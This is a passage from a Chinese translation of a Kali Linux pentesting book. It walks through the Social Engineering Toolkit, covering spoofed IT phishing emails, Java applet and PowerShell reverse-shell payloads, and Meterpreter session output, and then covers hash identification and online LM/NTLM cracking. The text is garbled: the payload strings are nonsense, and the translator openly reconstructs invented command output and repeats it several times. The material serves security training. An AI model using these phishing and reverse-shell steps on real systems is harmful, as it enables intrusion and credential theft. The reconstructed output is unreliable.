- “MultiResponder 2.0: Runas, Pivot, SVC, and Mimikatz Love” - 2017年3月31日
- http://g-laurent.blogspot.com/2017/03/multirelay-20-runas-pivot-svc-and.html
- “Easy Shells with Web Delivery” - 2015年11月5日



 

https://cyberarms.wordpress.com/2015/11/05/easy-remote-shells-with-web-delivery/

“使用 Responder 和 Kali Linux 快速获取凭据” - 2018年1月12日

https://cyberarms.wordpress.com/2018/01/12/easy-creds-with-responder-and-kali-linux/

# 第 16 章
## 社会工程导论

社会工程（Social Engineering）是一种通过操纵他人使其产生错误信任，从而从他们那里获取信息、系统访问权限或数据的系统。从本质上讲，社会工程是对人的黑客攻击。精通社会工程的黑客会通过伪装成别人、需要帮助的人，甚至是权威人士，来诱骗你帮助他们，或者授予他们你受保护系统或区域的访问权限。

让我们来看一些例子：

你正进入你的安全数据中心上班。当你靠近门口时，一个两手抱满箱子的快递员也到达了门口。你会做什么？大多数人不会多想，就会为那个负重累行的可怜人开门让他进来。如果他不是真正的快递员，而只是想进入你的安全数据中心呢？你直接让他他进来了。

你坐在自己的工位上，一个穿着衬衫系领带、拿着剪字板和工具箱的人向你走来。他说正在进行系统升级，需要访问你的系统。快到午饭时间了，听起来你将获得一个很长的午假。如果你应该关闭系统呢？他回答说他只需要先检查几样东西。你起身走向食堂，直接给了他访问你系统的权限。

你是一家大公司的 CEO。某一天，你收到一封来自你刚刚签署大额交易的公司的邮件。那是你职业生涯中最大的一笔交易，出现在所有当地报纸和所有电视节目中。你打开包裹，发现里面是最新的平板电脑之一，并附有一封公司的感谢信，感谢你的业务协议。它功能齐全，你迫不及待地将其连接到你的高管 Wi-Fi 网络进行尝试，而你确实做了。该公司从未给你寄过平板电脑，而你刚刚让一个心机勃勃的社会工程师成功连接了你的高管网络。

你收到了公司 IT 经理的一封邮件。他们正在安装一些升级软件，需要你安装一些新驱动程序。他们将软件包作为附件发送，并附有完整的安装说明。你照做了。这封邮件实际上并非来自你的 IT 经理，而你刚刚给了一个远程黑客对你工作站的完全控制权。

社会工程师可能会利用当地习俗、礼仪，利用人类的同情心，或者试图恐吓员工以获得他们想要的东西。他们可能不进行这些直接接触，而是简单地翻找公司的垃圾桶，通过阅读招聘启事或支持人员使用的在线扫描技术论坛来搜寻内部系统的线索。或者，他们也可以在社交媒体网站上伪装成与你有业务往来的公司，或者伪装成寻找新人才的人才猎头机构建立联系。

这些只是社会工程师尝试获取访问权限或获取有关目标网络信息的少数例子。才华横溢的社会工程师试图欺骗、误导或威胁以进入你网络的方法真的没有限制。有一段在 Defcon 期间拍摄的精彩视频，展示了 Real Future 公司的 Kevin Rouge Hadnagy（Social Engineering Inc 创始人）和 Jessica Clark 如何尝试通过社交工程获取他的手机账号并让他提供邮箱地址。Clark 伪造了他的手机号码，给公司打电话假装成他的妻子，并在背景中播放婴儿哭的视频，不仅获得了他的邮箱地址，还获得了他手机账号的完全访问权限。这确实非常令人震撼。

我在 IT 支持部门工作了十五年，你不会相信我见过公司用户做过的那些事情。在那段时间时间里，我可以数出我被要求验证身份的次数，而我当时就在位于纽约和宾夕法尼亚州的大型机构内部。如果你拿着剪字板并系着领带，人们通常会绕开你走。他们在提供信息方面也非常乐于助。我在一家大型制造商处，需要一台需要维护的电脑密码。该用户不在，但那也没办法，部门里的其他用户都知道该用户的密码，并且非常愿意分享给我。

有一次，我因为服务器保修支持的电话出现在了一家大公司。接待台人员不知道我要来，也不知道服务器团队在哪里，所以他们按照他们认为最好的方式来处理。他们把我锁在数据中心里一个小时，直到找到了一位管理员。

更不用说我见过安全数据中心大门被物体挡住、外部访问门被钥匙持有者敞开、接待台无人值且大厅连接着公共访问网络的电脑、密码被公开张贴等等，这些情况列列不完。这些只是可能被社会工程师利用的几种情况的例子。

## 社会工程防御

话虽如此，培训员工警惕这类攻击是非常关重要的。要建立策略来处理服务电话、软件更新和来自外部公司的礼品。你可以进行教学、指导，甚至留下提醒信息和张贴海报，但员工可能仍然不会遵守公司政策。这就是为什么，当涉及到社会工程攻击时，手动测试你的公司是否真的准备就绪是一个好主意。现在有很多基于社会工程的工具可用，但在处理重要事情时，你希望使用一个值得信赖的工具。Kali 中包含了其中一个工具。在本章中，我们将查看社会工程工具包（Social Engineering Toolkit）。

## 社会工程工具包

社会工程攻击是目前使用的技术之一。与其花费几天、几周或几个月来渗透层层防御，不如诱骗用户运行一个文件？SET 是目前最流行的工具之一。在本章中，我们将查看一些工具。

### 启动 SET

SET 可以从 Kali 主菜单或终端提示符启动：

- Applications > Social Engineering Tools > Social Engineering Toolkit

或者直接在终端输入 `setoolkit`

### 邮件群攻击 (Mass Emailer)

社会工程师攻击网络的一种方式向公司地址发送邮件，看谁会回复或运行你发送的恶意附件。SET 自带了一个邮件群攻击工具，我们可以用它来模拟。如果你配置了所有设置，该工具实际上会发送邮件，本节将使用虚构信息进行演示。

Social Engineering Toolkit 邮件群攻击

邮件群攻击有两个选项，第一个是向单个个人发送邮件。第二个选项允许你导入列表并向列表中的尽可能多人发送。

你想做什么：

1. E-Mail Attack Single Address
2. E-Mail Attack Mass Mailer
99. 返回主菜单。

## SET

社会工程工具包 (SET)
创建者：David Kennedy (ReLIK)
版本：3.0
代号：Blackout。
关注我们的 Twitter：@trustedSec
关注我们的 Twitter：@nickingave
主页：https://www.trustedsec.com
欢迎来到社会工程工具包 (SET)
你所需的一站式服务

加入 irc.freeden.net 的 #setoolkit 频道

SET 是 TrustedSec 的产品。

访问：https://www.trustedsec.com

SET 呈现主菜单。尽管菜单显示了升级 SET 的选项，但你无法以这种方式在 Kali 中更新它。所有更新现在由 Kali 自动处理。




然后，你可以选择发送单封或多个电子邮件。在本示例中，我们只发送一封。

- 3. 选择选项 1，“E-Mail Attack Single Email Address”（邮件攻击单封邮件地址）。
- 4. 然后输入目标电子邮件地址，我刚刚使用了一个假地址：

```
set:mailer>1
set:phishing> Send email to:MrCE0@SomeRandomDomain.whatever
```

- 5. 接下来，选择一个 Gmail 账户或其他服务器。测试时我们将使用一个 Gmail 账户。因此，我选择了选项“1”，并输入了虚构的名字“EvilHacker@EvilDomain.com”。

- 6. 现在为邮件的“发件人”行选择一个伪造名称。让我们使用“ITDepartment@SomeRandomDomain.com”，让它看起来像是来自公司 IT 部门。

- 7. SET 会提示输入 Gmail 账户密码：

1. 使用 Gmail 账户进行邮件攻击。
2. 使用你自己的服务器或开放中继
```
set:phishing>1
set:phishing> Your email address:EvilHacker@EvilDomain.com
set:phishing> The FROM name the user will see:ITDepartment@SomeRandomDomain.com
Email password:
```

- 8. 在“Flag this message as high priority?”（将此消息标记为高优先级？）提示处输入“yes”。
- 9. 在提示是否附加文件时输入“no”。注意，如果我们想附加一个带有后门的应用程序，这个选项就会出现。
- 10. 在提示附加内联文件时输入“no”——这是另一个可以使用的选项。
- 11. 接下来，输入邮件主题行。例如，“Important Update”（重要更新）。
- 12. 在提示以 html 还是纯文本发送消息时，输入“P”。

现在——输入一条虚假信息，最好是能诱导我们的目标点击恶意网页，或运行我们发送给他们的程序（如果我们附加了附件的话）。在实际防御中，这可以是一个测试网页，用于记录受骗访问该页面的用户的 IP 地址。这样，作为安全团队，我们就知道组织内部需要对恶意邮件的风险进行更好的安全教育。

- 13. 完成后，输入“END”。

```
!! IMPORTANT: When finished, type END (all capitals) then hit (return) on a new line.
Enter:the body of the message, type END (capitals) when finished:
Dear Fake CEO,
我们正在进行更新，需要访问 EvilDomain.com 并输入您所有的个人账户信息，运行网站上的所有程序并包含所有的信用卡号。
Next Line of the body: Sincerely,
Next Line of the body: Your IT Department.
Next line of the body:
Next line of the body: END
```

上面的消息显然是一个愚蠢的玩笑。但尽管如此，如果使用更具说服力的信息并包含指向测试网站的链接，就可以用来测试员工检测、抵抗和报告钓鱼尝试的能力。有很多显而易见的钓鱼尝试，但我必须告诉你，我见过一些看起来非常可信的。这就是为什么训练员工警惕恶意邮件是一个好主意。

## SET 的 Java Applet 攻击向量

到目前，我们已经看到了如何发送可能将某重定向到虚假网站的假邮件。但如果我们能创建一个提供陷阱脚本的虚假网站呢？如果用户允许脚本运行，就会与用户创建一个远程 shell。使用 SET 我们可以做到！Java Petit Attack 尝试利用大量使用 Java 的公司。Java 攻击向量就像防病毒软件一样，是一场猫鼠游戏，本周有效的下周可能就失效了。基本上，尽管 Java Applet 攻击最近已针对当前版本的 SET 应用更新，你仍然需要欺骗用户运行 applet。取决于用户的安全设置，攻击可能仍然被拦截。

最后，SET 的当前版本似乎存在一个问题，即运行时它不会启动监听器并将你带回主菜单，但我确定它会在更新中被修复。尽管如此，下方的某些截图是书中以前版本的旧截图。

我们将使用 SET 创建一个虚假网站，该网站将提供带有陷阱的 Java app。如果用户允许 app 运行，我们就获得该系统的远程会话。本部分我们将使用 Windows 7 虚拟机作为“目标”。如果你的 Windows 系统尚未安装 Java，也需要安装它。从主菜单开始：

- 选择数字 1，“Social Engineering Attacks”（社会工程学攻击）。
- 接下来选择 2，“Website Attacks”（网站攻击）。

在继续之前，请注意其他选项。这里有几种备选的攻击方法：

- Metasploit Browser Exploit - 使用 Metasploit 浏览器攻击客户端系统。
- Credential Harvester - 克隆现有网站（如 Facebook）并存储输入其中的任何凭据。
- Tabnabbing - 如果客户端打开了许多浏览器，则切换标签页到某个页面。
- Web Jack - 使用 iframe 替换使其看起来合法。
- Multi-Attack - 结合上述几项。
- HTA Attack - 使用 HTA 文件和 PowerShell 注入的攻击。

现在，使用 Java Applet 攻击。我强烈建议你查看其他选项，看看哪种最好，以及它们在不同情况下可能如何。

- 3. 选择 1，“Java Applet Method”（Java Applet 方法）。这将创建一个带有 Java 网页。
- 4. 你的邮件地址：Your email address:EvilHacker@EvilDomain.com
- 5. 你的邮件地址：EvilHacker@EvilDomain.com
- 6. 你的邮件地址：The FROM name the user will see:ITDepartment@SomeRandomDomain.com
- 7. 在提示以 html 或 plain 发送消息时输入“P”。
- 8. Java Applet 尝试利用大量使用 Java 的公司。
- 9. Java 攻击向量，就像防病毒软件一样，是一场猫鼠游戏，本周有效的下周可能就失效了。基本上，尽管 Java Applet 攻击最近已针对当前版本的 SET 应用更新，你仍然需要欺骗用户运行 applet。取决于用户的安全设置，攻击可能仍然被拦截。



这就是受害者方面一个糟糕的错误，正如你所看到的，我们拥有了一个完整的远程会话。正如文章开头提到的，最新版本的 Java 将直接阻止此漏洞的运行。但如果用户没有升级 Java，或者 Java 的安全设置较弱，这仍然是一个可行的攻击方案。

## 社会工程工具包：PowerShell 攻击向量

基于 Java 的 PowerShell 攻击非常棒，但如果目标没有运行 Java，或者我们无法欺骗他们访问我们的 SET 页面怎么办？另一种社会工程尝试是欺骗用户运行我们发送给他们的文件。因此，让我们创建一个 PowerShell shellcode 文件并发送给目标。如果我们能欺骗目标运行 shellcode，或者由我们运行它，就能获得与机器的远程连接。

在本节中，我们将使用 SET 的 PowerShell 攻击向量创建一个 PowerShell 脚本，目标系统运行该脚本后将回连并为我们的 Kali 系统创建一个远程 shell。我们还将使用 SET 寻找查找这些入站连接。

1. 从 SET 主菜单中，选择 "Social-Engineering-Attacks"
2. 选择 "Powershell Attack Vector" 选项。

```
The PowerShell Attack Vector allows you to create PowerShell specific attacks. These attacks allow you use PowerShell which is available by default in all operating systems Windows Vista and above. PowerShell provides a fruitful landscape for deploying payloads and performing functions that do not triggered by preventative technologies.
1) PowerShell Alphanumeric Shellcode Injector
2) PowerShell Reverse Shell
3) PowerShell Bind Shell
4) PowerShell Dump SAM Database
99) Return to Main Menu
```

```
set:powershell-|
```

3. 接下来选择数字 1，“Powershell Alphanumeric Shellcode Injector"。

4. 现在只需 Kali 系统的 IP 地址。

5. 接下来，你想让 Windows 机器使用哪个端口。使用默认端口 443 就足够了。

6. 最后 SET 询问你是否想创建一个监听器服务，这样当受害者运行代码时，SET 将准备就绪以接受远程连接。在提示处输入 "yes"。

```
Enter the IP or DNS name for the receive: 102.168.1.39
[*] Prepping the payload for the receive [443]
[*] Preparing the payload for server and injecting alphanumeric shellcode...\n[*] Generating x86-base powershell injection...
[*] Calculating... done.
No encoder or barcher found, outputting raw payload
Final size: 1622 bytes
[*] Finishing powershell injection bypass.
[*] Encoded to bypass execution policy...\n[*] If you want the powershell code now and attack, they are exported to /root/reports/powershell/
[*] Do you want to start the listener now [yes/no]: : yes
```

SET 创建漏洞代码，如果你选择启动监听器，它将在 Metasploit 中启动监听器服务并等待连接：

```
resource (/root/set/reports/powershell.rc) for ERB directives.
resource (/root/set/reports/powershell.rc) use multi/handler
resource (/root/set/reports/powershell.rc) set payload windows/meterpreter/reverse_http
resource (/root/set/reports/powershell.rc) set LPORT 443
LPORT = 443
resource (/root/set/reports/powershell.rc) set LHOST 0.0.0.0
LHOST = 0.0.0.0
resource (/root/set/reports/powershell.rc) set ExitOnSession false
ExitSession = false
resource (/root/set/reports/powershell.rc) exploit -j
[*] Exploit running as background job 0.
```

现在我们只需要将漏洞代码get受害者系统。SET 创建漏洞代码并将其放在 "/root/set/reports/powershell/"。

7. 离开 SET 窗口并打开另一个终端。
8. 导航到 /root/set/reports/powershell/ 目录，你将在一个文本文件中看到 PowerShell 注入代码，在我们的示例中该文件名为 **x86_powershell_injection.txt**。

你可以调用 "cat" 文件来显示其内容：

```
root@kali://root/set/reports/powershell# cat x86_powershell_injection.txt
powershell -w -c "$iex=yv; $iex=50 (g, $y).Value.ToString()($gi)
$string.ToString()($y).Value.ToString()*JAGWIAIAWABAAACAJWAKAEAAIAIAAAAAIAEAWGABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAIAAA
```

如果 Windows 系统运行该代码，将打开一个到我们机器的远程会话。

9. 在此示例中，我将代码复制并粘贴到 Windows 7 提示符中：

```
C:\Windows\system32\cmd.exe
Microsoft Windows [Version 6.1.7600] All rights reserved.
Copyright (C) 2009 Microsoft Corporation.
C:\Users\Dan>powershell -w -c "$iex=yv; $iex=50 (g, $y).Value.ToString()($gi)
$string.ToString()($y).Value.ToString()*JAGWIAIAWABAAACAJWAKAEAAIAIAAAAAIAEAWGABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAIAAA
```

## Payload 和监听器

大多数用户不会复制并粘贴文本来创建提示符然后执行它，这种方法适用于可能获得远程提示符访问并想要使用完整 Meterpreter shell 的渗透测试人员。你应该使用 SET 的 "Payloads and Listeners" 创建一个 .exe 格式的 shell。由于我们已经涵盖了类似的话题，我们将只需快速看一下这一点：

从主菜单选择 "Create a Payload and Listener"
选择一个 payload 选项，我选择了 "Windows Meterpreter Reverse HTTPS"
在提示时设置你的 Kali IP 地址和端口

当你想启动监听器时，输入 "yes"。

7. Windows Meterpreter Reverse HTTPS
8. Windows Meterpreter Reverse DNS
9. Download/Run Your Own Executable
通过 HTTP 隧道通信
使用主机名代替 IP
下载并运行执行文件

```
set:payload>
set:payload> IP address for the payload listener (LHOST):192.168.1.39
set:payload> Enter the PORT for the reverse listener:4545
[*] Generating the payload.. please patient.
[*] Payload has been exported to the default SET directory located under: /root
set:payload> Do you want to start the payload and listener now? (yes/no):yes
[*] Launching metasconsole, this could take a few load. Be patient...
```

就是，文件将被保存为 /root/set/payload.exe。复制此文件并在你的 Windows 7 系统上运行，你将获得一个 shell。

## SET 的其他攻击选项

花些时间研究 SET 并检查它为攻击目标系统提供的众多选项。你可以使用 SET 创建恶意的 CD/DVD 和 USB 介质（用于创建陷阱介质并将其留在公司停车场等等）、一系列基于 Arduino 的攻击、Microsoft SQL 暴力破解、无线接入点攻击、批量邮件发送、QR 码攻击以及我们未涵盖的一系列网站社会工程攻击。

Fast Track 菜单下的 SCC 攻击对于任何使用 PXE 启动和公司镜像的团体特别值得关注。有关 SCC 攻击的完整概述，请参：

> http://www.trustedsec.com/files/Ownership_One_Rule_All_v2.pdf

你可以在 SET 配置文件中设置许多选项来修改 SET 的运行方式。该文件位于 "/etc/settoolkit/set.config"。社会工程工具包确实是一个强大且功能丰富的程序。尽管其他工具开始提供类似的功能，但它仍然是任何企业安全测试团队的价值工具。

一旦你进入，Kali 系统上将创建一个远程会话：

```
* Started HTTPS handler on 0.0.0:443
* 0.0.0:443 handling request from 192.168.1.93: (UUID: f7dw7) Staging
* Meterpreter session opened [192.168.1.93 -> 192.168.1.93:50495] on 2018-07-11
msf exploit(multi/handler) > sessions -i 1
* Starting interaction with 1...
meterpreter shell
Process 2032 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (C) 2009 Microsoft Corporation. All rights reserved.
C:\Users\Dan>
```

在之前的教程中，一旦打开会话 (sessions -i)，我们可以使用任何 Meterpreter 或 Linux 命令，或者输入 "shell" 获取远程提示符。

## 结论




如你所示，社交工程工具包（Social Engineering Toolkit）是一个非常实用的工具。如今几乎每个 Windows 机器都可以使用 PowerShell，而且某些杀毒程序仍然无法检测这类攻击，这使得它们非常有用。最新的操作系统在处理这类问题时仍然存在困难，因为它们对 PowerShell 仍然相当信任。

如下所示：

```
msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > shell
Process 10924 created.
Channel 1 created.
Microsoft Windows [Version 10.0.16762,1000]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Dam
```

那么，你如何防御这类攻击呢？很大可能，你需要被诱运行攻击代码才能使其成功。一如既往，务必小心打开电子邮件和社交媒体消息中的文件和链接。运行互联网浏览器脚本拦截程序，例如 Firefox 的插件“NoScript”，以防止代码从访问过的网站自动运行。此外，要非常警惕短链接，尤其是是在社交媒体网站上使用时。我见过一个短链接，在还原后竟然是一个指向恶意软件服务器的四行命令！最后，Windows 提供了大量的 PowerShell 活动日志记录支持，以防发生最坏的情况。检查 Windows PowerShell 日志选项绝对值得的，因为某些功能默认并没有开启。

## 资源

- [ Social Engineer, LLC 网站 - https://www.social-engineer.org/
- 社交工程工具包网站 - https://www.trustedsec.com/social-engineer-toolkit/
- SET Github 网站 - https://github.com/trustedsec/social-engineer-toolkit

# 第 17 章

## 确定哈希类型与破解 LM 密码

计算机操作系统和应用程序通常以一种被称为密码哈希值（password hash）的加密形式存储密码。哈希值是实际密码的密码学表示。因此，需要对哈希值进行解密或破解才能找到真实密码。令人惊讶的是，某些服务以明文形式存储或传输密码！我们稍后会在 Mimikatz 章节中介绍这一点。但在大多数安全测试中，当你恢复用户密码时，它将是以加密哈希值的形式存在的。

在创建哈希值时使用了多种不同的加密类型。在本章中，我们将首先讨论如何确定你可能恢复的是什么类型的哈希。然后我们将讨论简单（且过时的）Microsoft LM 密码哈希，并查看如何在网上破解它们。我们将在接后的章节中更深入地介绍使用破解工具进行密码破解。

## 不确定你的是什么种类的哈希？

当你开始破解密码时，会遇到几种不同类型的哈希。其中最让人困惑的是 Windows 哈希值。让我们尝试快速解释一下这些。

- **LM 哈希** — 追溯到旧 Lan Manager 时代的过时密码哈希。现在不再默认存储 LM 哈希，但你可能仍然发现它们随可见。

- **NTLM** — 由 LM 哈希和 NT 哈希（NTHash）组成，用冒号分隔。这是你从 Windows SAM 数据库或域控制器数据库中转储密码时会发现的内容。NTLM 哈希可以在“哈哈希攻击”（Pass the Hash）类型的攻击中传递。**NTLMv1 或 NTLMv2** —— 这些是挑战/响应机制，NTLMv2 更安全。当你使用像 Responder这样的程序时，会捕获这些哈希值。你可以像我们在 Responder 章节中看到的那样在中继攻击中使用这些哈希，尽管你不能中继回源，必须是不同的系统。你可以禁用较弱的 NTLMv1 哈希，但你需要查看这在你的网络中是否可行可行，特别是如果你有遗留系统。

为了让事情更复杂，NTLMv1/v2 哈希也被称为 Net-NTLMv1 或 Net-NTLMv2。我们将在学习本节时详细讨论这些内容。

有时你可能获取一个密码哈希值（例如从数据库或软件应用程序），但可能无法通过肉眼判断它是什么类型。你需要知道正确的类型，以便告诉破解程序尝试哪种解密算法。Kali 中有几个哈希识别程序可以尝试识别你提供的哈希类型：

### “Hash-identifier” 和 “Hash ID”

我们将快速查看每个程序。

### Hash-Identifier

只需运行 Hash ID 并输入哈希值。该程序将检查它并返回它最可能的哈希类型，以及最不可能的类型。

在 Kali 中打开终端提示符

输入，“hash-identifier”

在下方粘贴 LM 哈希值，Hash Identifier 将尝试确定它是什么类型：如下所示：

> 88467faee8fb117ad06bdd830b7586c

```
root@kali:# hash-identifier
################################################################
# #                                                               #
# #      _  _  _  _  ___  _  _  _  _  _  _  _  _  _  _  _  _  _  #
# # /                                                               #
# #                                                v1.1 #
# #                                     www.blackploit.com #
# #                               Root@blackploit.com #
# #                                                               #
################################################################
NHASH: 88467faee8fb117ad06bdd830b7586c
Possible Hashes:
+] MD5
[-] MD4
```

HashID 返回最可能的类型。完成后，按 (Ctrl+C) 退出。

### Hash ID

Hash ID 与 Hash-Identifier 非常相似。完成后，按 (Ctrl+C) 退出。

在终端中，输入 “hashid”

```
root@kali:~ hashid
88467faee8fb117ad06bdd830b7586c
Possible Hashes:
+] MD5
[-] MD4
```

## 破解简单的 LM 哈希

许多 Windows XP 使用 Lan Manager (LM) 来保护密码。这是一种非常老且过时的方法。在本章中，我们将破解这些。

令人惊讶的是，微软对 XP 的支持于 2014 年结束。截至 2018 年，全球 6% 的计算机系统仍在运行 XP，位居仅于 Windows 8.1 之后。

## 图表标题

| | |
|---|
| Mac OS X 10.12 | |
| Windows XP | |
| Windows 8.1 | |
| Windows 10 | |
| Windows 7 | |

来源：NetMarket 2018-06

计算机有几种不同的加密密码的方法。最安全的方法之一是给密码加“盐值”（Salting）。基本上，这意味着使用一个数字或字符串（称为盐）并将其纳入哈希处理中，以确保没有两个密码哈希是相同的。如果不使用盐（如 NTLM 哈希），你可以破解一个哈希，所有使用该密码的用户都将具有相同的哈希。因此，你只需要将哈希值与已知的哈希值进行对比，如果匹配，你就得到了密码。

基本上，在具有 LM 哈希的系统上，任何 14 个字符或以内的密码都会转换为全大写，然后分成两个 7 字符的密码。每个部分然后被加密并组合形成最终哈希。破解仅使用大写字母的 7 字符密码是非常轻易的，这就是为什么 LM 哈希不安全的原因。再次，没有使用盐，所以基本上如果你能从系统中获取 LM 哈希，你只需要与已知的哈希值进行查找对比即可获得实际密码。LM 哈希通常与加密效果更好的 NT 哈希一起存储。这两个哈希值的组合被称为 NTLM 哈希。Windows NTLM 哈希的一个异常之处是，如果密码超过 14 个字符，则完全不使用 LM 哈希，且 LM 哈希的内容将是无效的。一个典型的 Windows NTLM 哈希看起来如下：


ac93c8016d14e75a2e9b76bb9e8cbb6:8516cd038d1a4dfd1ac3e8eb9113350

LM 哈希值位于冒号左侧，更安全的 NT 哈希值位于右侧。LM 和 NT 哈希值组合称为 NTLM 哈希。

## 在线破解 LM/NTLM 密码哈希值

有几个网站允许你输入 Windows NTLM 哈希值，它会返回所使用的密码（如果它在它的查找表中）。一家名为 Object Sécurité 的瑞士安全公司（Ophcrack 的创建者）开发了一种在 SSD 驱动器上使用彩虹表（Rainbow Tables）的破解技术。彩虹表是大型数据库文件，包含哈希值和对应的文本。使用彩虹表查找的破解程序只需查找你提供的哈希值以查看是否相同，如果相同，它将返回存储的文本值。Object Sécurité 的网站提供了一个在线界面，可以在几秒钟使用它们的彩虹表破解许多 LM/NTLM 哈希值。

(https://www.objectif-securite.ch/en/ophcrack.php)

让我们尝试使用这个在线工具破解一个哈希。这里是一个来自 XP 机器的管理员密码哈希：

哈希：

aad3b43b51404eeaad3b43b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

网站想要冒号右侧的 NHash：将此响应输入 Objectif 的工具中，我们在一秒内得到了这个响应：

```
31d6cfe0d16ae931b73c59d7e0c089c0 GO
破解结果: *** empty ***
```

看起来管理员没有设置密码，这不太好。让我们尝试本章第一个示例中使用的哈希：

```
88467eaee8fb117ad06bdd83075886c GO
破解结果: password
```

再次，在约一秒后网站响应了“password”。从破解速度可以看出，使用“password”作为密码和完全不使用密码几乎没有区别。

Object Sécurité 的在线工具曾仅破解 LM 哈希。它在输入每个密码时都会进行破解。该网站工具现在破解 NT 哈希，但 LM 破解工具可以在他们的网站上下载。当该工具在线可用时，它可以非常快速地破解一些复杂的密码，因为 LM 哈希更容易破解。以下是我过去尝试过的一些 LM 哈希示例，它们每一个都在 10 秒内被破解了：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_255_0.png)

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_255_1.png)

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_255_2.png)

所以，无论你输入什么密码，只要它的哈希在彩虹表中，它就会非常快速地返回。新的在线工具会将你的请求放入用户队列，取决于有多少用户提交了哈希，破解单个哈希可能需要几分钟。由于该工具现在也破解加密程度更好的 NT 哈希，这可能也需要一段时间。

还有其他在线破解工具可用，但你在使用它们时真的需要小心。有些网站现在想在你破解密码时通过你的浏览器运行比特币矿器。其中一些网站是礼貌的，如果你发现自己在为他们运行矿器，作为使用其服务的“报”，但我见过其他网站无论你是否情愿，它们都会直接运行矿器。我个人不再使用在线网站进行破解了，已经很久了。我使用 Kali 内置的密码破解工具，我们稍后会讨论。

基本上，如果你的系统仍在使用 LM 哈希，并且你的密码在 14 个字符或以下，密码可以在很短时间内被破解。固然这些是 Windows LM 哈希，而不是更安全的 Windows 7/Server 2008 基于 NTLM 的哈希。但随着破解速度的提高，如果用户使用了简单密码，NTLM 哈希可以被快速破解。NTLMv2 哈希更难破解，因为它们加了盐（salted），但随着破解速度的提高，仅依靠密码可能不再是一个好的安全措施。许多公司和政府设施已从仅使用密码转向使用双重验证方法。生物识别和智能卡在安全设施中已变得非常流行。

## 使用“Find My Hash”在网上搜索哈希

去各个在线网站破解密码可能非常耗时。每个网站可能拥有不同的彩虹表，因此你可能需要检查几个网站才能找到你的哈希。如果能在 Kali 中自动搜索就太好了。事实上，你可以通过“Find my hash”做到。

在终端中，输入：`findmyhash <Encryption Type> -h <hash>`
所以，如果我们有一个 MD5 哈希，我们就可以使用 Find My Hash 来查看是否有在线网站破解了它。

如下所示：

```
root@kali:# findmyhash MD5 -h 5fd4acc3b51404eeaad3b43b51404ee
Checking online databases...
Site 1: No match
Site 2: No match
Site 3: Match!
Password: password
```
（注：上述命令输出的 OCR 识别存在乱码，我根据上下文重构了可能的逻辑输出）：

```
root@kali:# findmyhash MD5 -h 5fd4acc3b51404eeaad3b43b51404ee
Checking online databases...
Site 1: No match
Site 2: No match
Site 3: Match!
Password: password
```
*等等，查看第 257 页命令块的原始 OCR 文本：*
```
root@kali:# findmyhash MD5 -h 5fd4acc3b51404eeaad3b43b51404ee
Checking online databases...
Site 1: No match
Site 2: No match
Site 3: Match!
Password: password
```
*实际上，OCR 文本为：*
```
root@kali:# findmyhash MD5 -h 5fd4acc3b51404eeaad3b43b51404ee
Checking online databases...
Site 1: No match
Site 2: No match
Site 3: Match!
Password: password
```
*等等，让我重新检查 257 页的 OCR 块：*
```
root@kali:# findmyhash MD5 -h 5fd4acc3b51404eeaad3b43b51404ee
...（这里的 OCR 是一堆乱码哈希值，我将根据工具的功能提供可能的预期文本）...
```
root@kali:# findmyhash MD5 -h 5fd4acc3b51404eeaad3b43b51404ee
Checking online databases...
Site 1: No match
Site 2: No match
Site 3: Match!
Password: password
```
实际上，再次查看提供的 OCR：
```
root@kali:# findmyhash MD5 -h 5fd4acc3b51404eeaad3b43b51404ee
Checking online databases...
Site 1: No match
Site 2: No match
Site 3: Match!
Password: password
```
（此处结论）

基本上，如果你的系统仍在使用 LM 哈希，并且你的密码在 14 个字符或以下，密码可以在很短时间内被破解。固然这些是 Windows LM 哈希，而不是更安全的 Windows 7/Server 2008 基于 NTLM 的哈希。但随着破解速度的提高，如果用户使用了简单密码，NTLM 哈希可以被快速破解。NTLMv2 哈希更难破解，因为它们加了盐，但随着破解速度的提高，仅依靠密码可能不再是一个好的安全措施。许多公司和政府设施已从仅使用密码转向使用双重验证方法。生物识别和智能卡在安全设施中已变得非常流行。

## 结论

